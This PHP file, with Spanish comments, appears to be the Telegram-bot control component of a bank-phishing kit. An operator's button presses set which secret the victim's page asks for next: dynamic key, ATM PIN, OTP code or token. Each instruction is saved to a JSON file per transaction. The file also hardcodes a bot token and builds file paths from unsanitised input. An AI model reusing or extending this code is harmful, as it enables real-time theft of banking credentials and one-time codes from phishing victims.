<?php
$botToken = "8003869491:AAHPtZmIR_jF9eANF82hoQS8UPPFuahcXNY"; // tu token

$update = json_decode(file_get_contents('php://input'), true);

if (isset($update["callback_query"])) {
    $chatId = $update["callback_query"]["message"]["chat"]["id"];
    $callbackId = $update["callback_query"]["id"];
    $data = $update["callback_query"]["data"];

    file_get_contents("https://api.telegram.org/bot$botToken/answerCallbackQuery?callback_query_id=$callbackId");

    // Extraer transaction ID
    $parts = explode(":", $data);
    $accion = $parts[0];
    $transactionId = $parts[1];

    // Guardar la instrucción en un archivo JSON
    $filename = "verificaciones/$transactionId.json";
    file_put_contents($filename, json_encode(["accion" => $accion], JSON_PRETTY_PRINT));

    // Enviar confirmación al canal
    $mensajes = [
        "pedir_dinamica" => "🔐 Usuario solicitó CLAVE DINÁMICA.",
        "pedir_cajero"   => "🏧 Usuario solicitó CLAVE DE CAJERO.",
        "pedir_otp"      => "🔢 Usuario solicitó CÓDIGO OTP.",
        "pedir_token"    => "🔑 Usuario solicitó TOKEN.",
        "error_tc"       => "❌ Usuario reportó ERROR DE TARJETA.",
        "error_logo"     => "❌ Usuario reportó ERROR DE LOGO.",
    ];

    $msg = $mensajes[$accion] ?? "⚠️ Acción desconocida.";
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg));
}
if (!$transactionId || !$accion) {
  // Algo salió mal, no crear archivo
  exit;
}
